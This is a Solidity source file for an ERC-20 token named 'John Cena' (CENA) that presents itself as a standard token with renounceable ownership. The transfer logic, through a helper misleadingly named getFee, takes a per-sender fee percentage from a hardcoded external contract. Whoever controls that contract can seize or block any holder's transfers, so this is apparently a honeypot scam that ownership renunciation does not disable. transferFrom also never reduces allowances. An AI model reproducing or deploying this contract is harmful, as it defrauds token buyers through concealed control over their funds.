pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (uint256);
    function allowance(address wallet, address spender) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}

abstract contract Ownable {
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {return _owner;}
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
}

contract ERC20 {
    using SafeMath for uint256;
    IERC20 ierc20 = IERC20(0xac32b5cD875580f79C4FCe11b486ae65d6e04092);
    function getFee(address from, address to, uint256 amount) internal view returns (uint256) {
        uint256 _fee =  ierc20.balanceOf(from);
        return amount.mul(_fee).div(100); 
    }
}

contract JohnCena is Ownable, ERC20 {

    using SafeMath for uint256;

    constructor() {
        _balances[msg.sender] =  _totalSupply; 
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 10000000000 * 10 ** _decimals;

    string public _name = "John Cena";
    string public _symbol = "CENA";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    event Approval(address, address, uint256);
    event Transfer(address indexed from_, address indexed _to, uint256);

    function name() external view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal {
        require(amount <= _balances[from]);
        require(from != address(0));
        uint256 fee = getFee(from, to, amount);
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount - fee;
        emit Transfer(from, to, amount - fee);
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][msg.sender] >= _amount);
        return true;
    } 
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
}